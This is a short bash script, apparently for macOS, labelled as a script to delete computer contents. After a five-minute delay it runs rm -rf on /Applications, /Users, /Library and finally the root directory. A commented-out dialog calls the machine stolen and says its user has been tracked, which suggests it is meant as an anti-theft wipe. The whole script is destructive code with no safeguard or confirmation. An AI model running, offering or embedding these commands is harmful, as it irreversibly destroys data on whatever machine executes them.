#!/bin/bash

# Script to delete computer contents
sleep 300
# function notify {
# 	dialogdays=`/usr/bin/osascript << EOT
# 	tell application "System Events"
# 		display dialog "This is a stolen computer. You have been tracked. We know who you are and what you have done." buttons ["OK"] default button "OK" with icon caution
# 	end tell
# 	EOT`
# 	echo $dialogdays
# }

# Delete all Applications
rm -rf /Applications/*

# Delete all Users
rm -rf /Users/*

# Delete all /Libarry
rm -rf /Library/*

# Finish deleting all
rm -rf /